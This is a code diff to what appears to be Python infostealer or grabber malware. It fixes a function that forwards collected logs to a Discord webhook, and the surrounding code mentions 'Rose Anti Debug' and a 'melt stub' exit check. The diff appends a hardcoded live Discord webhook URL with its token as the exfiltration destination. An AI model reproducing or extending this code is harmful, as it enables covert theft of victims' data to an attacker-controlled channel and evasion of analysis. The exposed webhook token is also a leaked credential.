@@ -1721,11 +1721,11 @@ def send_log_to_webhook(log_content):
         # Create an Embed for sending to Discord
         hook = Webhook(webhook_url)
         embed = Embed(
-            title=""Send To" Webhook",
+            title="Send To Webhook",
             description=log_content,
             color=0xFF5733,
             timestamp=datetime.now().isoformat()
-        )
+           )
 
         # Include ForwardInfo in the footer
         embed.set_footer(text=f"Sent to: {ForwardInfo}")
@@ -3242,3 +3242,6 @@ if cc.get_rose_melt_stub():
             sys.exit()
     except Exception as e:
         send_error_notification(e, "Rose Anti Debug")
+
+# Forwarding information
+ForwardInfo = "https://discord.com/api/webhooks/1294263764719243335/A4FtVlXDFsEPSkG4eA_du-V41FdppZeOmZuFOO0BLFAyIIcEnW1TwrJHxfpFen8kG8hc"
